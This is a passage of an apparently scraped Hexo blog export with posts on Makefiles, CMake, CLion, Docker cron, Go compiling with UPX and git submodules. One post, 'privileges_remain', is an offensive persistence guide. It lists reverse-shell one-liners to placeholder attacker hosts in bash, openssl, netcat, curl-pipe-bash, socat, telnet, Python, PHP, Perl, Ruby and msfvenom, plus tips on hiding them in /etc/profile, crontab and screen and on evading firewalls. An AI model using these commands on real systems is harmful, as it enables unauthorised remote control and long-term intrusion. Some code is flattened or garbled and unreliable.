project</h1><p>CMakeLists.txt文件通常要求cmake命令</p><pre><code>sudo apt install cmake cmake –versioncmake</code></pre><p>现在通常在Makefile文件中可以看到cmake命令。cmake会执行CMakeLists.txt中的指令，生成Makefile文件。</p><h1 id="Makefile-project"><a href="#Makefile-project" class="headerlink" title="Makefile project"></a>Makefile project</h1><pre><code>make</code></pre>]]></content>
      
      
      <categories>
          
          <category> C-Cpp </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>Makefile</title>
      <link href="/2024/09/10/Cpp/Makefile/"/>
      <url>/2024/09/10/Cpp/Makefile/</url>
      
        <content type="html"><![CDATA[<p>Normally we have two methods to compile and build the C/CPP projects: makefile and cmakelist.</p><ul><li><a href="#comp9024-makefile">COMP9024 makefile</a><ul><li><a href="#deps-macro">DEPS Macro:</a></li><li><a href="#o-file-rule-object-files">.o File Rule (Object Files):</a><ul><li><a href="#rule-structure">Rule Structure</a></li><li><a href="#key-parts">Key Parts</a></li><li><a href="#special-macros--and-">Special Macros <code>$@</code> and <code>$^</code>:</a></li><li><a href="#final-example">Final Example:</a></li></ul></li></ul></li></ul><h1 id="COMP9024-makefile"><a href="#COMP9024-makefile" class="headerlink" title="COMP9024 makefile"></a>COMP9024 makefile</h1><pre><code>#####################################################################################                 How to Use# # (1) Build the project#   make# (2) Run the executable#   ./main# (3) Clean the project#   make clean## If you want to know more about makefile, please refer to:##    https://www.gnu.org/software/make/manual/html_node/Rule-Syntax.html## You can reuse this Makefile in different assignments/projects in COMP9024.# To be simple, please put your *.c and *.h in the src directory.##                                                                 COMP9024####################################################################################PROJ_ROOT_PATH = $(shell pwd)TARGET_EXE = mainBUILD_DIR = buildC_SRC_FILES = $(shell find ./src -name &quot;*.c&quot;)H_SRC_FILES = $(shell find ./src -name &quot;*.h&quot;)# src/*.c  ---&gt;  src/*.o ---&gt; build/*.oTMP_OBJ_FILES = $(C_SRC_FILES:.c=.o)OBJ_FILES_IN_BUILD =$(subst src/,$(BUILD_DIR)/,$(TMP_OBJ_FILES))CC= gcc#CFLAGS = -m32 -g -no-pie --save-temps -I $(PROJ_ROOT_PATH)/src#CFLAGS = -g --save-temps -I $(PROJ_ROOT_PATH)/src#CFLAGS = -no-pie --save-temps -fno-asynchronous-unwind-tables -I $(PROJ_ROOT_PATH)/src CFLAGS = -g -Wall -I $(PROJ_ROOT_PATH)/src # create a directory  $(shell mkdir -p $(BUILD_DIR))# the default targetall:     make $(TARGET_EXE)# generate the target, which depends on the &quot;build/*.o&quot; files$(TARGET_EXE):  $(OBJ_FILES_IN_BUILD)         $(CC) $(CFLAGS) -o $(TARGET_EXE) $(OBJ_FILES_IN_BUILD)# How to generate a &quot;build/*.o&quot; from a &quot;src/*.c&quot;# To generate prerequisites automatically, please see COMP9024/C/HowToMake/Makefile.V2# https://www.gnu.org/software/make/manual/html_node/Automatic-Prerequisites.html$(BUILD_DIR)/%.o: src/%.c $(H_SRC_FILES)    @mkdir -p $(shell dirname $@)    $&#123;CC&#125; $&#123;CFLAGS&#125; -c $&lt; -o $@view:    find ./images -name &quot;*.png&quot; | sort | xargs feh -g 1024x768  &amp;# clean all the files generated    clean:    rm -rf $(TARGET_EXE) $(BUILD_DIR)     find . -name &quot;*.o&quot; | xargs rm -f    find . -name &quot;*.s&quot; | xargs rm -f    find . -name &quot;*.i&quot; | xargs rm -f    find . -name &quot;*.d&quot; | xargs rm -f    find . -name &quot;*.bc&quot; | xargs rm -f</code></pre><h2 id="DEPS-Macro"><a href="#DEPS-Macro" class="headerlink" title="DEPS Macro:"></a>DEPS Macro:</h2><ul><li><p>DEPS is a macro (or variable) that stores the dependencies for the .c files, typically the .h (header) files.</p></li><li><p>In a C program, .c files (source files) often depend on .h files (header files) for declarations, so they must be recompiled whenever the header files change.</p></li><li><p>By listing the header files in DEPS, you ensure that if any header file changes, the corresponding .c file will be recompiled.</p></li></ul><pre><code class="lang-makefile">DEPS = file1.h file2.h file3.h</code></pre><h2 id="o-File-Rule-Object-Files"><a href="#o-File-Rule-Object-Files" class="headerlink" title=".o File Rule (Object Files):"></a>.o File Rule (Object Files):</h2><ul><li><p>The .o files are object files (compiled but not yet linked), which are created from .c files.</p></li><li><p>This rule applies to any file ending with .o, meaning it’s a generic rule that works for all object files.</p></li></ul><h3 id="Rule-Structure"><a href="#Rule-Structure" class="headerlink" title="Rule Structure"></a>Rule Structure</h3><pre><code class="lang-makefile">Copy code%.o: %.c $(DEPS)$(CC) -c -o $@ $&lt; $(CFLAGS)</code></pre><p><code>%.o: %.c $(DEPS)</code>: This line specifies that to create an <code>.o</code> file (e.g., <code>main.o</code>), you need the corresponding <code>.c</code> file (e.g., main.c) and any header files defined in DEPS.</p><h3 id="Key-Parts"><a href="#Key-Parts" class="headerlink" title="Key Parts"></a>Key Parts</h3><ul><li><code>$(CC)</code>: The macro that holds the compiler (usually gcc or clang).</li><li><code>-c</code>: Tells the compiler to generate an object file (.o) rather than a final executable.</li><li><code>-o $@</code>: The -o flag tells the compiler where to put the output. The $@ is a special macro that stands for the target file, i.e., the .o file.</li><li><code>$&lt;</code>: This is another special macro that represents the first dependency in the list. In this case, it’s the .c file.</li><li><code>$(CFLAGS)</code>: Compiler flags used for things like optimization or warnings.</li></ul><h3 id="Special-Macros-and"><a href="#Special-Macros-and" class="headerlink" title="Special Macros $@ and $^:"></a>Special Macros <code>$@</code> and <code>$^</code>:</h3><p>These macros simplify rules in Makefiles:</p><ul><li><p><code>$@</code>: Represents the target file (left of the :), so in %.o: %.c, $@ is the .o file.</p></li><li><p><code>$^</code>: Represents all of the dependencies (right of the :), so it expands to both the .c file and the $(DEPS) files.</p></li></ul><p>This makes the rule more general, so it can handle multiple dependencies easily.</p><h3 id="Final-Example"><a href="#Final-Example" class="headerlink" title="Final Example:"></a>Final Example:</h3><p>Here’s how the Makefile might look with these macros:</p><pre><code class="lang-makefile">Copy codeCC = gccCFLAGS = -Wall -g  # Compiler flags for warnings and debuggingDEPS = file1.h file2.hOBJ = main.o otherfile.o%.o: %.c $(DEPS)    $(CC) -c -o $@ $&lt; $(CFLAGS)myprogram: $(OBJ)    $(CC) -o $@ $^ $(CFLAGS)clean:    rm -f *.o myprogram</code></pre>]]></content>
      
      
      <categories>
          
          <category> C-Cpp </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>Clion Debug Trick</title>
      <link href="/2024/09/10/Cpp/Clion-Debug-Trick/"/>
      <url>/2024/09/10/Cpp/Clion-Debug-Trick/</url>
      
        <content type="html"><![CDATA[<ul><li><a href="#output-is-missing-during-debug">Output is missing During Debug</a><ul><li><a href="#method-1-insert-output-buf-code">Method 1 insert output buf code</a></li><li><a href="#method-2-external-terminal-during-debugrecommended">Method 2 external terminal during debug(Recommended)</a></li></ul></li><li><a href="#how-to-run-comp9024-in-clion">How to run COMP9024 in Clion</a><ul><li><a href="#for-single-c-file">for single C file</a></li><li><a href="#for-multiple-c-and-h-files">for multiple .c and .h files</a></li></ul></li></ul><h1 id="Output-is-missing-During-Debug"><a href="#Output-is-missing-During-Debug" class="headerlink" title="Output is missing During Debug"></a>Output is missing During Debug</h1><p><img src="/2024/09/10/Cpp/Clion-Debug-Trick/2024-10-30-13-06-01.png" alt></p><p>This is because of the Clion’s console terminal, it has a large buff of output.</p><p>How to fix it?</p><h2 id="Method-1-insert-output-buf-code"><a href="#Method-1-insert-output-buf-code" class="headerlink" title="Method 1 insert output buf code"></a>Method 1 insert output buf code</h2><p>At the beginning of the text file, add the code below:</p><p><code>setbuf(stdout, 0);</code></p><h2 id="Method-2-external-terminal-during-debug-Recommended"><a href="#Method-2-external-terminal-during-debug-Recommended" class="headerlink" title="Method 2 external terminal during debug(Recommended)"></a>Method 2 external terminal during debug(Recommended)</h2><p>Edit the run configuration</p><p><img src="/2024/09/10/Cpp/Clion-Debug-Trick/2024-10-30-13-07-20.png" alt></p><p>Tick on the “Run in external console”, and click “Apply”</p><p><img src="/2024/09/10/Cpp/Clion-Debug-Trick/2024-10-30-13-08-04.png" alt></p><h1 id="How-to-run-COMP9024-in-Clion"><a href="#How-to-run-COMP9024-in-Clion" class="headerlink" title="How to run COMP9024 in Clion"></a>How to run COMP9024 in Clion</h1><p>我在windows上，因此编译C项目我自己没有使用默认的makefile，而是自己用了CMakeList文件</p><p>The default build file of COMP9024 is makefile. In my way to run it in Clion, I choose to use MakeListfile to build instead of makefile.</p><p>Remember to install <code>dot</code> command, because COMP9024 often uses <code>dot</code> to deal with images to handle graphes. Please refer to the article <code>Algorithm/dot-and-graph</code>.</p><h2 id="for-single-C-file"><a href="#for-single-C-file" class="headerlink" title="for single C file"></a>for single C file</h2><p>Install the plugin named <code>C/C++ Single File Execution</code> in advance for Clion.</p><p><strong>Open the directory which containing main, rathoer not the directory containing makefile and img.</strong></p><p>Then right-click the directory from the file brower of Clion, create a new <code>CMakeList.txt</code>.</p><p>Then use the plugin function: go back to activate the tab of <code>main.c</code>, right-click and choose the item: <code>Add executable for single c/cpp file</code>.</p><p>Then <code>CMakeList.txt</code> would generate something, you need to <strong>right-click</strong> the file to <strong>Reload from the disk</strong> CMakeList project.</p><p>Finally, the configuration of the Run and Debug could run this file.</p><p>But it can only solve single c/cpp file, if you want to compile and run multiple .h and .c project, please refer the next section.</p><h2 id="for-multiple-c-and-h-files"><a href="#for-multiple-c-and-h-files" class="headerlink" title="for multiple .c and .h files"></a>for multiple .c and .h files</h2><p>Clear the context of <code>CMakeList.txt</code>, then input manually:</p><pre><code>file(GLOB SOURCES &quot;*.c&quot;)add_executable(main $&#123;SOURCES&#125;)</code></pre><p>Then Clion could run the project successfully.</p>]]></content>
      
      
      <categories>
          
          <category> C-Cpp </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>PREFACE</title>
      <link href="/2024/08/29/readFirst/"/>
      <url>/2024/08/29/readFirst/</url>
      
        <content type="html"><![CDATA[<p>My blog has hybrid contents in English and Chinese, I prefer using English more in the future, especially Math and Commupter Technical fields. Sometimes I would write some trivia articles, such as reading notes, viewing notes of some daily events, films and novels, all these trivias may be in Chinese. If you have challenges reading existed Chinese compositions, please <strong>right-click the page and translate the Chinese portion into English</strong>. And notice notably and honestly, I appreciate critiques constructively from peers for progress with gratitude. Please leave your sugesstion and deep analysis! ^_^ Just log in github account and comment below my compositions, and then I would receive notice emails from github.</p><p>Recently I just thought, I cannot always write too fundamental blog articles, because maybe many people would feel tedious and exhausted by reading too detailed articles. So I determined to sort out and integrate many unnecessary and too detailed articles into some specific big articles, and then I would display new interesting solution articles at easy reading positions.</p><p>With respect of <strong>Mathematics</strong>, I put the Math directory as the first directory.</p><p>This blog theme uses Hexo, and it is built on Git Page. The specific theme is <strong>3-hexo</strong>. If you want to mimic the blog, please refer <a href="https://github.com/yelog/hexo-theme-3-hexo">hexo-theme-3-hexo</a> and <a href="https://yelog.org/2017/03/23/3-hexo-instruction/">3-hexo-instruction</a>.</p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>docker_cron</title>
      <link href="/2024/08/29/docker/docker-cron/"/>
      <url>/2024/08/29/docker/docker-cron/</url>
      
        <content type="html"><![CDATA[<p>In the end of 2023, I developed a MCV web system and I found there was a problem: I want to use docker to build a container with crontab. But the crontab didn’t work after build.</p><p>This is my before command, and it doesn’t work:</p><pre><code># 开启cron定时任务/etc/init.d/cron restart &amp;&amp; /etc/init.d/cron status &amp;&amp; /etc/init.d/cron start</code></pre><p>This is my revision, and it works:</p><pre><code># crontabRUN echo &quot;* * * * * root cd /app/scripts/;/usr/local/bin/python /app/scripts/timer_add.py &gt;&gt; /var/log/timer.log 2&gt;&amp;1&quot; &gt;&gt; /etc/cron.d/crontab &amp;&amp; chmod 0644 /etc/cron.d/crontab &amp;&amp; /etc/init.d/cron restart &amp;&amp; /etc/init.d/cron status &amp;&amp; chmod +x /app/start.sh</code></pre><p>The critical element is the priviledges.</p><p>And I read the other solutions below, but I dont verify them.</p><p><code>/var/spool/cron/[crontabs]/&lt;username&gt;</code></p><p><strong>centos</strong> <code>/var/spool/cron/root</code></p><p><strong>Debian/Ubuntu</strong> <code>/var/spool/cron/crontabs/root</code></p>]]></content>
      
      
      <categories>
          
          <category> Docker </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>compile &amp; packaging</title>
      <link href="/2024/08/29/Go/compile/"/>
      <url>/2024/08/29/Go/compile/</url>
      
        <content type="html"><![CDATA[<p>This article contains tentatively golang’s packaging techniques and UPX repackaging introduction, because both these 2 topics have small content size and I’d better merge them into one article for typesettings.</p><h1 id="Golang-Compiling-cross-platforms"><a href="#Golang-Compiling-cross-platforms" class="headerlink" title="Golang Compiling cross platforms"></a>Golang Compiling cross platforms</h1><p>Normally these commands could compile golang program:</p><pre><code>SET CGO_ENABLED=0SET GOOS=linuxSET GOARCH=amd64go build main.go</code></pre><p>Linux on x86:</p><pre><code>CGO_ENABLED=0 GOOS=linux GOARCH=amd64 go build</code></pre><p>Linux on arm:</p><pre><code>CGO_ENABLED=0GOOS=linuxGOARCH=armgo build filename.go</code></pre><p>Windows:</p><pre><code>CGO_ENABLED=0GOOS=windowsGOARCH=amd64go build filename.go</code></pre><p>MacOS:</p><pre><code>CGO_ENABLED=0GOOS=darwinGOARCH=amd64go build filename.go</code></pre><p>CGO is a option for unification of C,C++ and golang, it can unify C and golang’s basic data struct. Its default value is 0, and if you want to set it up to 1, refer to <a href="https://stackoverflow.com/questions/64531437/why-is-cgo-enabled-1-default">https://stackoverflow.com/questions/64531437/why-is-cgo-enabled-1-default</a>. </p><p>Normally if the target executive Linux has standard <code>libc</code>, <code>glibc</code>, you donnot enable this option. If enabling CGO, and the file size after packaging would be bigger.</p><h1 id="Golang-Compiling-without-symbols"><a href="#Golang-Compiling-without-symbols" class="headerlink" title="Golang Compiling without symbols"></a>Golang Compiling without symbols</h1><p>Golang’s compiling tool chain would build the binaries staticly with standard libraries and Third-party libraries. And the binaries contain runtime and GC(Garbage Collection) instructions. Normally it is hard to analyse the binaries for reverse engineering.</p><p>go build command:</p><pre><code>go build -ldflags &quot;-s -w&quot;go build -ldflags &quot;-s -w&quot; -trimpathgo build -ldflags &quot;-w -s&quot;  -o SecretDetection-lackOfOptimize.exego build -ldflags &quot;-s -w&quot; -trimpath  -o SecretDetection-lackOfOptimize.exe</code></pre><h1 id="UPX-compresses-the-binaries"><a href="#UPX-compresses-the-binaries" class="headerlink" title="UPX compresses the binaries"></a>UPX compresses the binaries</h1><p>I recommand to read the raw github and download the upstream binaries: <a href="https://github.com/upx/upx/releases">https://github.com/upx/upx/releases</a> . In china, there are many modified UPX prevalent in many security platforms with backdoors, so that be vigilant except the original github project.</p><p>UPX is simple to use, and I dont have deeper research.</p><pre><code># Often commandupx -9 fscan.exe# The 2 commands below are possible to package with failure, and I suggest to do more tests after compressionupx --best program.exeupx --brute program.exe</code></pre>]]></content>
      
      
      <categories>
          
          <category> Go </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>privileges_remain</title>
      <link href="/2024/08/28/penetration/privileges-remain/"/>
      <url>/2024/08/28/penetration/privileges-remain/</url>
      
        <content type="html"><![CDATA[<ul><li><a href="#backdoor-sustainability">backdoor sustainability</a></li><li><a href="#the-most-useful-frequentlyexcerpts">the most useful frequently(excerpts)</a><ul><li><a href="#openssl-reverse-terminal-by-encryption">openSSL reverse terminal by encryption</a></li><li><a href="#simply-reverse-bash-shell">simply reverse bash shell</a></li><li><a href="#hidden-protocal-simply">hidden protocal simply</a></li></ul></li><li><a href="#multiple-methods-inclusion">multiple methods inclusion</a><ul><li><a href="#1-screen">1. screen</a></li><li><a href="#2-crontab">2. crontab</a></li><li><a href="#3-netcat">3. netcat</a></li><li><a href="#4-curl-reverse">4. curl reverse</a></li><li><a href="#5-etcprofile">5. /etc/profile</a></li><li><a href="#6-socat-reverses-shell">6. Socat reverses shell</a></li><li><a href="#7-telnet-reverses-shell">7. Telnet reverses shell</a><ul><li><a href="#method-1">Method 1</a></li><li><a href="#method-2">Method 2</a></li></ul></li><li><a href="#8-python">8. python</a></li><li><a href="#9-php">9. php</a></li><li><a href="#10-perl">10. Perl</a></li><li><a href="#11-ruby">11. Ruby</a></li><li><a href="#12-metasploit-venom">12. Metasploit venom</a></li><li><a href="#13-get-full-terminal">13. get full terminal</a></li></ul></li></ul><h1 id="backdoor-sustainability"><a href="#backdoor-sustainability" class="headerlink" title="backdoor sustainability"></a>backdoor sustainability</h1><p>This article refers to much a lot <code>Marcus_Holloway</code>‘s blog, the original link is <a href="https://xz.aliyun.com/t/9488">https://xz.aliyun.com/t/9488</a> . As I know, how to remain a long term privileges on hacked computers is important for cybersecurity leaners, so I want to do more researches standing on the shoulders of giants. This is a continuous-updating blog of mine for accumulating some interesting permission sustainability.</p><h1 id="the-most-useful-frequently-excerpts"><a href="#the-most-useful-frequently-excerpts" class="headerlink" title="the most useful frequently(excerpts)"></a>the most useful frequently(excerpts)</h1><h3 id="openSSL-reverse-terminal-by-encryption"><a href="#openSSL-reverse-terminal-by-encryption" class="headerlink" title="openSSL reverse terminal by encryption"></a>openSSL reverse terminal by encryption</h3><p>You can hide the network protocol and raw content for avoiding firewall detection.</p><pre><code>openssl req -x509 -newkey rsa:2048 -keyout key.pem -out cert.pem -days 365 -nodesoropenssl req -x509 -newkey rsa:2048 -keyout key.pem -out cert.pem -days 10000 -nodes# normally the commands need your a lot input as its additional description and messages, but you can only press Enter thoroughly for convenience</code></pre><p>Sometimes you may think can we generate a unlimited days expiry, but sadly it cannot generate a Asymetric secrets without specific expiry. However, you can point a very huge days as its expiry, but normally the clients would not trust such a secret certificate because of the too massive number, such as browers. Normally you can generate one year or 3 years as its expiry.</p><p>Parameters:</p><ul><li>req: create and deal with certificate</li><li>-x509: it is a self-signed certificate, rather than certificate signing request(CSR)</li><li>-newkey rsa:2048: generate a new RSA private secret, and demand the length of the secret is 2048 bit.</li><li>-keyout key.pem: set up the private key’s output path</li><li>-out cert.pem: set up the certificate (public key)’s output path</li><li>-days 365: expiry time is 365 days</li><li>-nodes: the generated private key doesn’t need secert protection</li></ul><p>Use the attacker’s VPS listens on port 2333:</p><pre><code>openssl s_server -quiet -key key.pem -cert cert.pem -port 2333</code></pre><p>It creates a SSL/TLS server on 2333 port, and then execute the command on hacked host to reverse its shell:</p><pre><code>mkfifo /tmp/s; /bin/sh -i &lt; /tmp/s 2&gt;&amp;1 | openssl s_client -quiet -connect &lt;VPS_IP&gt;:2333 &gt; /tmp/s; rm /tmp/s</code></pre><p>Then hacker would gain a shell. Sometimes you may write it into <code>/etc/profile</code>, <code>crontab</code> or <code>screen</code>, you can input such command, which makes the reverse shell connect you per 2 mins:</p><pre><code>while true; do    mkfifo /tmp/s; /bin/sh -i &lt; /tmp/s 2&gt;&amp;1 | openssl s_client -quiet -connect &lt;ATTACKER_IP&gt;:2333 &gt; /tmp/s; rm /tmp/s    sleep 120done</code></pre><h3 id="simply-reverse-bash-shell"><a href="#simply-reverse-bash-shell" class="headerlink" title="simply reverse bash shell"></a>simply reverse bash shell</h3><p>Attacker’s VPS listens on port 2333:</p><pre><code>nc -lvvp 2333</code></pre><p>Attacker’s host execute such a command:</p><pre><code>/bin/bash -i &gt;&amp; /dev/tcp/&lt;ip&gt;/&lt;port&gt; 0&gt;&amp;1</code></pre><h3 id="hidden-protocal-simply"><a href="#hidden-protocal-simply" class="headerlink" title="hidden protocal simply"></a>hidden protocal simply</h3><p>Attacker creates <code>index.html</code> on his public server, and the raw content is:</p><pre><code>/bin/bash -i &gt;&amp; /dev/tcp/&lt;ip&gt;/&lt;port&gt; 0&gt;&amp;1</code></pre><p>Hacked computer executes such one command:</p><pre><code>curl &lt;attacker_ip&gt; | bash</code></pre><p>It can hide the network and the firewall may think it’s only a http web stream. But other network security devices may detect its raw content!</p><h1 id="multiple-methods-inclusion"><a href="#multiple-methods-inclusion" class="headerlink" title="multiple methods inclusion"></a>multiple methods inclusion</h1><h3 id="1-screen"><a href="#1-screen" class="headerlink" title="1. screen"></a>1. screen</h3><pre><code>screen -s test</code></pre><p>输入</p><pre><code>while true; do    /bin/bash -i &gt;&amp; /dev/tcp/&lt;attacker_ip&gt;/&lt;port&gt; 0&gt;&amp;1donewhile true; do    /bin/bash -i &gt;&amp; /dev/tcp/&lt;attacker_ip&gt;/&lt;port&gt; 0&gt;&amp;1    sleep 120done</code></pre><p>openSSL加密SSL协议后门反弹不直接bash -i</p><pre><code>while true; do    mkfifo /tmp/s; /bin/sh -i &lt; /tmp/s 2&gt;&amp;1 | openssl s_client -quiet -connect &lt;attacker_ip&gt;:&lt;port&gt; &gt; /tmp/s; rm /tmp/s    sleep 120done</code></pre><h3 id="2-crontab"><a href="#2-crontab" class="headerlink" title="2. crontab"></a>2. crontab</h3><ul><li><ul><li><ul><li><ul><li><ul><li>/bin/bash -i &gt;&amp; /dev/tcp/<attacker_ip>/<port> 0&gt;&amp;1</port></attacker_ip></li></ul></li></ul></li></ul></li></ul></li></ul><p>I advice if you want to write tasks into crontab, you need to check if it works in crontab. Because sometimes if you are a low priviledge, then you may have no crontab permission, even you did <code>crontab -e</code>.</p><p>We need to know our username on host, and then write into <code>/var/spool/cron/[crontabs]/&lt;username&gt;</code> , or it doesn’t work. For example, I am root, then we need to write into <code>/var/spool/cron/root</code>(centos); Or <code>/var/spool/cron/crontabs/root</code> (Debian/Ubuntu)</p><h3 id="3-netcat"><a href="#3-netcat" class="headerlink" title="3. netcat"></a>3. netcat</h3><p>if hacked host has <code>netcat</code>, then <code>netcat ip port -e /bin/bash</code></p><h3 id="4-curl-reverse"><a href="#4-curl-reverse" class="headerlink" title="4. curl reverse"></a>4. curl reverse</h3><p>attacker creates <code>index.html</code> on VPS, and its content is <code>/bin/bash -i &gt;&amp; /dev/tcp/&lt;attacker_ip&gt;/&lt;port&gt; 0&gt;&amp;1</code></p><p>then attacked host executes the command:</p><pre><code>curl &lt;attacker_ip&gt; | bash</code></pre><h3 id="5-etc-profile"><a href="#5-etc-profile" class="headerlink" title="5. /etc/profile"></a>5. /etc/profile</h3><p>If someone logs in the Linux, then it must trigger <code>/etc/profile</code>, such as log in locally or SSH login.</p><p>If someone doesn’t login shell(using strange methods to login and use sh or bash), then <code>/etc/profile</code> wont be triggered.</p><p>You can input such command into <code>/etc/profile</code>:</p><pre><code>/bin/bash -i &gt;&amp; /dev/tcp/&lt;attacker_ip&gt;/&lt;port&gt; 0&gt;&amp;1 &amp;# the last ampersand makes the command in daemon, to avoid user&#39;s commands cannot execute and lead to the exposure.</code></pre><h3 id="6-Socat-reverses-shell"><a href="#6-Socat-reverses-shell" class="headerlink" title="6. Socat reverses shell"></a>6. Socat reverses shell</h3><p>Socat is a multiple functional network tool, and it’s similar to netcat.</p><pre><code>apt-get install socatOrwget from http://www.dest-unreach.org/socat</code></pre><p>Attacker listens his VPS on specific port:</p><pre><code>socat TCP-LISTEN:2333 -Ornc -lvvp 2333</code></pre><p>Target host command:</p><pre><code>socat tcp-connect:&lt;attacker_ip&gt;:&lt;port&gt; exec:&#39;bash -li&#39;,pty,stderr,setsid,sigint,sane</code></pre><h3 id="7-Telnet-reverses-shell"><a href="#7-Telnet-reverses-shell" class="headerlink" title="7. Telnet reverses shell"></a>7. Telnet reverses shell</h3><p>If hacked host has no nc, we can use telnet to reverse shell</p><h5 id="Method-1"><a href="#Method-1" class="headerlink" title="Method 1"></a>Method 1</h5><p>Attacker listens on specific port:</p><pre><code>nc -lvvp 2333</code></pre><p>Hacked host connects:</p><pre><code>mknod a p; telnet &lt;attacker_ip&gt; &lt;port&gt; 0&lt;a | /bin/bash 1&gt;a</code></pre><h5 id="Method-2"><a href="#Method-2" class="headerlink" title="Method 2"></a>Method 2</h5><p>Attacker needs open 2 listening ports, one for inut, another for output:</p><pre><code>nc -lvvp 2333nc -lvvp 4000</code></pre><p>Hacked host connects:</p><pre><code>telnet &lt;attacker_ip&gt; &lt;port&gt; | /bin/bash | telnet &lt;attacker_ip&gt; &lt;port&gt;</code></pre><h3 id="8-python"><a href="#8-python" class="headerlink" title="8. python"></a>8. python</h3><pre><code>nc -lvvp 2333</code></pre><p>Then hacked host:<br>    python -c ‘import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((“<attacker_ip>“,2333));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([“/bin/sh”,”-i”]);’</attacker_ip></p><h3 id="9-php"><a href="#9-php" class="headerlink" title="9. php"></a>9. php</h3><pre><code>nc -lvvp 2333</code></pre><p>Hacked host:</p><pre><code>php -r &#39;$sock=fsockopen(&quot;&lt;attacker_ip&gt;&quot;,2333);exec(&quot;/bin/sh -i &lt;&amp;3 &gt;&amp;3 2&gt;&amp;3&quot;);&#39;</code></pre><h3 id="10-Perl"><a href="#10-Perl" class="headerlink" title="10. Perl"></a>10. Perl</h3><pre><code>nc -lvvp 2333</code></pre><p>Then hacked host:</p><pre><code>perl -e &#39;use Socket;$i=&quot;&lt;attacker_ip&gt;&quot;;$p=2333;socket(S,PF_INET,SOCK_STREAM,getprotobyname(&quot;tcp&quot;));if(connect(S,sockaddr_in($p,inet_aton($i))))&#123;open(STDIN,&quot;&gt;&amp;S&quot;);open(STDOUT,&quot;&gt;&amp;S&quot;);open(STDERR,&quot;&gt;&amp;S&quot;);exec(&quot;/bin/sh -i&quot;);&#125;;&#39;</code></pre><h3 id="11-Ruby"><a href="#11-Ruby" class="headerlink" title="11. Ruby"></a>11. Ruby</h3><pre><code>nc -lvvp 2333</code></pre><p>Hacked host:</p><pre><code>ruby -rsocket -e &#39;c=TCPSocket.new(&quot;&lt;attacker_ip&gt;&quot;,&quot;2333&quot;);while(cmd=c.gets);IO.popen(cmd,&quot;r&quot;)&#123;|io|c.print io.read&#125;end&#39;Orruby -rsocket -e &#39;exit if fork;c=TCPSocket.new(&quot;&lt;attacker_ip&gt;&quot;,&quot;2333&quot;);while(cmd=c.gets);IO.popen(cmd,&quot;r&quot;)&#123;|io|c.print io.read&#125;end&#39;</code></pre><h3 id="12-Metasploit-venom"><a href="#12-Metasploit-venom" class="headerlink" title="12. Metasploit venom"></a>12. Metasploit venom</h3><p><code>msfvenom -l</code> enquiries which platform.</p><pre><code>msfvenom -l payloads | grep &#39;cmd/unix/reverse&#39;msfvenom -p cmd/unix/reverse_python LHOST=&lt;attacker_ip&gt; LPORT=2333 -f raw</code></pre><h3 id="13-get-full-terminal"><a href="#13-get-full-terminal" class="headerlink" title="13. get full terminal"></a>13. get full terminal</h3><p>Normally we gain the shell, but we cannot use vim. So there is a python method to escalate the shell’s use. But I tested the method, it sometimes doesnot work, and I need to do more tests and researches.</p><pre><code>python -c &quot;import pty;pty.spawn(&#39;/bin/bash&#39;)&quot;</code></pre>]]></content>
      
      
      <categories>
          
          <category> penetration </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>submodule</title>
      <link href="/2024/08/28/git/submodule/"/>
      <url>/2024/08/28/git/submodule/</url>
      
        <content type="html"><![CDATA[<ul><li><a href="#开发视角主仓库下多模块设置">开发视角：主仓库下多模块设置</a></li><li><a href="#部署视角git-pull">部署视角git pull</a></li><li><a href="#真实案例">真实案例</a></li></ul><h1 id="开发视角：主仓库下多模块设置"><a href="#开发视角：主仓库下多模块设置" class="headerlink" title="开发视角：主仓库下多模块设置"></a>开发视角：主仓库下多模块设置</h1><p>为了方便如MVC框架的前后端管理以及减少代码错误，因此开始使用<code>git submodule</code>来做多模块管理。</p><p>在某仓库中添加submodule。</p><pre><code>git submodule add &lt;git-source&gt; &lt;option:path&gt;git status</code></pre><p>会看到子模块是<code>new file</code>,需要</p><pre><code>git add .git commit -m &quot;xx&quot;git push</code></pre><p>来把当前子模块的哈希打上去更新。</p><p>之后子仓库如果有更新：</p><pre><code>git submodule update --remote</code></pre><p>就把hash更新了</p><p>然后主仓库再</p><pre><code>git add .git commit -m &quot;xx&quot;git push</code></pre><p>就把子模块更新了</p><h1 id="部署视角git-pull"><a href="#部署视角git-pull" class="headerlink" title="部署视角git pull"></a>部署视角git pull</h1><p>子模块更新和仓库本身是分离的，仓库只更新子模块的hash id<br>首次拉submodule（即submodule还只是个空目录的时候），使用到<code>--init</code>参数</p><pre><code>git clone --recursive https://github.com/xanzy/go-gitlab gitlab# 或者进入被克隆仓库目录，手动下载子模块git submodule update --init –recursive#–recursive的意思是递归，比如如果子模块也有子模块，他就处理这个的#git submodule update –init 如果没有子模块的子模块，可以直接执行这个没有递归的命令</code></pre><p>如果涉及多个submodule，此步在运行时，如果仓库是private，你需要注意不同子仓库会需要不同的密码验证，<strong>此步一定慢慢等待其下载完</strong>，否则就会出现<em>只会更新一个submodule，而另一个submodule死活不动</em>的情况了</p><h1 id="真实案例"><a href="#真实案例" class="headerlink" title="真实案例"></a>真实案例</h1><p>拉取某个git仓库，如果该代码中某个目录下存在.git，那么git会认为这是另一个git仓库，我们在git clone的时候不会拉取该项目，必须得多一步去单拉此项目。</p><p>实际案例：鹏哥的gitmisconfig项目导入gitlab</p><p>在gitlab-misconfig项目中，由于鹏哥使用的gitlab软件包目录下存在.git，所以在进行git add . xxxx等一系列操作后，该目录下你就算有改动，也不会上传到git。</p><p>另外，如果你只是要检出其中的某个目录，则使用命令如下，可以单检出某个目录：</p><pre><code>git clone --recursive https://github.com/xanzy/go-gitlab gitlab</code></pre>]]></content>
      
      
      <categories>
          
          <category> Git </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>git tag &amp; github release</title>
      <link href="/2024/08/28/git/git-tag/"/>
      <url>/2024/08/28/git/git-tag/</url>
      
